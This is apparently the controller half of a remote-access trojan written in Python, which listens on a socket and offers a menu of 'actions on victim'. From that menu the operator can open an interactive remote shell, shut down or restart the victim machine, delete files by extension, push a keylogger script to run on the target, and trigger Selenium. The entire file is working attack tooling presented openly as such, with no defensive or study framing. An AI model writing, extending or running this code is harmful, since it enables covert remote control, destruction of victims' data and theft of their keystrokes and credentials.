import SocketClass

def run_attack():
    while True:
        print("""
                    ////////////////////--- Menu ---//////////////////
                    //  This tool can run these action on victim:   //
                    //  1. Get Shell                                //
                    //  2. Shutdown or Restart                      //
                    //  3. Delete Files                             //
                    //  4. Run Keylogger                            //
                    //  5. Run Selenium                             //
                    //  6. Exit                                     // 
                    //////////////////////////////////////////////////
                    """)
        try:
            choice = int(input("Please enter your choice: "))
        except ValueError:
            print("Your input is wrong. Please try again.")
            continue

        if choice == 6:
            Ss.send_data("6")
            print("See you soon :)")
            Ss.s.close()
            break

        elif choice == 1:
            Ss.send_data("1")
            print("You connect to victim shell. Please enter your command(enter 'q' for exit):")
            while True:
                send = input("Shell# ")
                if send == "q":
                    Ss.send_data(send)
                    break
                Ss.send_data(send)
                res = Ss.receive_data()
                print(res)

        elif choice == 2:
            Ss.send_data("2")
            while True:
                print("""
                    You can choose these items:
                    1. Shutdown system after 10 seconds
                    2. Restart system after 10 seconds
                    3. Cancel this action
                    4. Exit
                    """)
                send = input("Please enter your choice: ")
                if send == "4":
                    Ss.send_data(send)
                    break
                elif send == "1":
                    Ss.send_data("shutdown /t 10")
                elif send == "2":
                    Ss.send_data("shutdown /r /t 10")
                elif send == "3":
                    Ss.send_data("shutdown /a")
                else:
                    print("Your input is wrong.")
                    continue
                res = Ss.receive_data()
                print(res)

        elif choice == 3:
            Ss.send_data("3")
            send = input("Please enter your extention (e.g doc, pdf, jpg and etc): ")
            Ss.send_data(send)
            res = Ss.receive_data()
            print(res)

        elif choice == 4:
            Ss.send_data("4")
            f = open(".\\key_logger.py","r")
            send = f.read()
            f.close()
            Ss.send_data(str(send))
            print(Ss.receive_data())
            print(Ss.receive_data())

        elif choice == 5:
            Ss.send_data("5")
            print(Ss.receive_data())
             
        else:
            print("Your input is wrong. Please try again.")

Ss = SocketClass.Ssocket("s")
Ss.bind_socket()
Ss.listen_port(5)
run_attack()